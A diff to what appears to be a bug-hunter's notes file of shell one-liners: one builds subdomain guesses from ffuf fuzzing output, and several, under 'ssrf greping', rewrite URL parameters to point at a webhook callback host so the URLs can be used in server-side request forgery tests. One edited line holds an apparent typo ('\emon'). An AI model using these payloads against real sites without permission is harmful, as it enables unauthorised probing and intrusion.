@@ -1,7 +1,7 @@
 cat ffuf.txt| sed -e 's/FUZZ : //g; s/FFUFHASH : [0-9a-f]\+//g; s/ //g'|while read d;do echo $d'.domain.com'|tee -a fuzz.txt;done
 ssrf greping 
-cat urls.txt| sed -E 's/=[hH][tT][tT][pP][sS]?(%3A%2F%2F|:\/\/)([a-zA-Z0-9.-]+)(:[0-9]+)?([^=&]*)/=https:\/\/webhook.site\/webhookherea\4/g'    //=http or =https
-cat urls.txt|  nl -w1 -s' ' | sed -E 's/([0-9]+) (.*)=[hH][tT][tT][pP][sS]?(%3A%2F%2F|:\/\/)[a-zA-Z0-9.-]+([^=&]*)/\2=https:\/\/web-hook\/\1\4/g'
+cat urls.txt| sed -E 's/=[hH][tT][tT][pP][sS]?(%3A%2F%2F|:\/\/)([a-zA-Z0-9.-]+)(:[0-9]+)?([^=&]*)/=https:\/\/web-hook.site\/web-hookherea\4/g'    //=http or =https
+cat urls.txt|  nl -w1 -s' ' | sed -E 's/([0-9]+) (.*)=[hH][tT][tT][pP][sS]?(%3A%2F%2F|:\/\/)[a-zA-Z0-9.-]+([^=&]*)/\2=https:\/\/web-hook\/\emon\1\4/g'
 
 
-cat urls.txt| sed -E 's/=(\/|%2F)?([^=&]*)/=https:\/\/webhook.site\/webhookarea\/\2/g'    // =/path/file.png or =%2fpath%2fphile.ext or =path/path/file.ext
+cat urls.txt| sed -E 's/=(\/|%2F)?([^=&]*)/=https:\/\/web-hook.site\/webhookarea\/\2/g'    // =/path/file.png or =%2fpath%2fphile.ext or =path/path/file.ext
